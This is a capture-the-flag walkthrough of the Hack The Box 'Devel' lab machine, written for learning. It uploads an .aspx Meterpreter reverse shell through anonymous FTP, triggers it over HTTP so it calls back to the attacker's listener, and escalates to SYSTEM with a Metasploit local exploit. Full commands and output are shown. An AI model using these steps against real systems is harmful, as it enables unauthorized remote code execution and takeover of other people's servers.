# Target
[Devel](https://app.hackthebox.com/machines/Devel/information), while relatively simple, demonstrates the security risks associated with some default program configurations. It is a beginner-level machine which can be completed using publicly available exploits.

# Scan
```
nmap -sS -sC $TARGET_IP
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 19:03 CET
Nmap scan report for 10.129.86.228
Host is up (0.026s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
80/tcp open  http
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7

Nmap done: 1 IP address (1 host up) scanned in 9.81 seconds
```

# Foothold
FTP allows for anonymous connection. By browsing FTP root directory we can see that this is also root directory for HTTP server. What is more we have write permission to this directory. Let's try to upload `.aspx` probe to see if we could execute arbitrary code (Remote Code Execute vulnerability) on IIS server.

```
curl -s -T - ftp://anonymous@$TARGET_IP/probe.aspx <<EOF && \
curl -s http://$TARGET_IP/probe.aspx | grep -q 1337 && echo "\nTarget is \e[31;43mvulnerable\e[0m to RCE" || echo "\nTarget is not vulnerable to RCE" && \
curl -s ftp://anonymous@$TARGET_IP/probe.aspx -Q "-DELE probe.aspx" > /dev/null
<%@ Page Language="C#"%>
<html>
<head>
</head>
<body>
<%Response.Write(1000+300+30+7); %>
</body>
</html>
EOF
```

Our probe shows that `Target is vulnerable to RCE`. We could use this vulnerability to upload `.aspx` reverse shell. Let's start Metasploit `multi/handler` with `windows/meterpreter/reverse_https` payload.
```
msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload windows/meterpreter/reverse_https; run"
```

```
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => windows/meterpreter/reverse_https
[*] Started HTTPS reverse handler on https://10.10.14.212:4444
```

It's waiting for connection, so now let's create reverse shell with `.aspx` format, upload it over anonymous FTP connection, execute with HTTP GET call (to establish connection to `multi/handler`) and delete with another FTP connection.
```
msfvenom -p windows/meterpreter/reverse_https \
    LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) \
    LPORT=4444 \
    -f aspx |\
curl -s -T - ftp://anonymous@$TARGET_IP/shell.aspx && \
curl -s http://$TARGET_IP/shell.aspx && \
curl -s ftp://anonymous@$TARGET_IP/shell.aspx -Q "-DELE shell.aspx" > /dev/null
```

After couple of seconds we should get our reverse shell connection for IIS user:
```
[*] https://10.10.14.212:4444 handling request from 10.129.86.228; (UUID: kssv2nos) Staging x86 payload (178780 bytes) ...
[*] Meterpreter session 1 opened (10.10.14.212:4444 -> 10.129.86.228:49247) at 2025-01-15 20:38:47 +0100

meterpreter > getuid 
Server username: IIS APPPOOL\Web
```

# Privileges escalation
To elevate privileges we could use Meterpreter `getsystem`, but in this case it does not give any results, so we could try with WinPEAS or, as we are using Meterpreter, use Multi Recon Local Exploit Suggester.
```
meterpreter > background
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > run
```

Suggester have found plenty of vulnerabilities to chose from, let's go with [CVE-2013-1300](https://nvd.nist.gov/vuln/detail/CVE-2013-1300) which could be exploited with `exploit/windows/local/ms13_053_schlamperei`.
```
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms13_053_schlamperei
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms13_053_schlamperei) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/ms13_053_schlamperei) > set LHOST tun0
LHOST => 10.10.14.212
msf6 exploit(windows/local/ms13_053_schlamperei) > set LPORT 5555
LPORT => 5555
msf6 exploit(windows/local/ms13_053_schlamperei) > run

[*] Started reverse TCP handler on 10.10.14.212:5555 
[*] Launching notepad to host the exploit...
[+] Process 3096 launched.
[*] Reflectively injecting the exploit DLL into 3096...
[*] Injecting exploit into 3096...
[*] Found winlogon.exe with PID 432
[*] Sending stage (177734 bytes) to 10.129.86.228
[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell
[*] Meterpreter session 2 opened (10.10.14.212:5555 -> 10.129.86.228:49256) at 2025-01-15 21:25:25 +0100

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

At this point all that is left is to grab flags.
```
meterpreter > cat /Users/babis/Desktop/user.txt
********************************
meterpreter > cat /Users/Administrator/Desktop/root.txt
********************************
```